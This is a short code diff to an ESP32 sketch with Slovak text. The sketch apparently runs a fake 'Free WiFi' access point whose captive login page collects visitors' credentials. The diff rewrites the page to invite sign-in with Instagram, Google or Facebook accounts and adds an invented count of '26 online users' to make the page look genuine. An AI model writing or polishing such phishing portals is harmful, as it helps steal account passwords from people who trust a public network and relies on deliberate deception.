@@ -1,3 +1,4 @@
+
 #include <WiFi.h>                   // Knižnica pre ESP32 WiFi
 #include <DNSServer.h>
 #include <WebServer.h>              // Knižnica pre ESP32 WebServer
@@ -38,9 +39,9 @@ Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);
 #define SSID_NAME "Free WiFi"
 #define SUBTITLE "Free WiFi service."
 #define TITLE "Prihlásenie:"
-#define BODY "Create an account to get connected to the internet."
+#define BODY "Je možné prihlásiť sa napríklad cez Instagam, Google, Facebook pre internetové pripojenie."
 #define POST_TITLE "Overuje sa ..."
-#define POST_BODY "Váše pruhlásenie je v procese. Prosím, počkajte 1 minutu pre pripojenie .</br>Ďakujeme za trpezlivosť."
+#define POST_BODY "Váše prihlásenie je v procese. Prosím, počkajte 1 minutu pre pripojenie .</br>Ďakujeme za trpezlivosť.</br>Pripojení ONLINE používatelia: 26</br>Stat: Active"
 #define PASS_TITLE "Credentials"
 #define CLEAR_TITLE "Cleared"
 
